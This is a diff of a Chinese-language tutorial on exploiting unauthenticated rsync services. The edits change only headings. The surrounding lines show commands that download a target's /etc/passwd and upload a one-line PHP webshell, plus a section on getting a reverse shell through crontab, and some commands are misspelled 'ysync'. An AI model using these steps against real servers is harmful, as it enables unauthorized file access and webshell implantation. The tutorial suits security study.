@@ -19,8 +19,6 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
 
 ![](http://cdn.laohuan.art/2020-05-29_16-40-45.png)
 
-##### 下载文件
-
 下载目标的passwd文件
 
 `rsync rsync://url:80/src/etc/passwd ./`
@@ -31,7 +29,7 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
 
 ![](http://cdn.laohuan.art/2020-05-29_16-47-07.png)
 
-#### 上传shell
+#### 上传一句话木马
 
 `ysync -av shell.php rsync://url:端口/src`
 
@@ -43,7 +41,7 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
 
 #### 反弹shell
 
-##### crontab
+crontab
 
 Linux crontab是用来定期执行程序的命令。
 
@@ -125,7 +123,7 @@ secrets file = /etc/rsyncd.passwd
 
 `ysync :password`
 
-##### 参考链接
+#### 参考链接
 
 <https://blog.csdn.net/qq_36374896/article/details/84112341/>
 
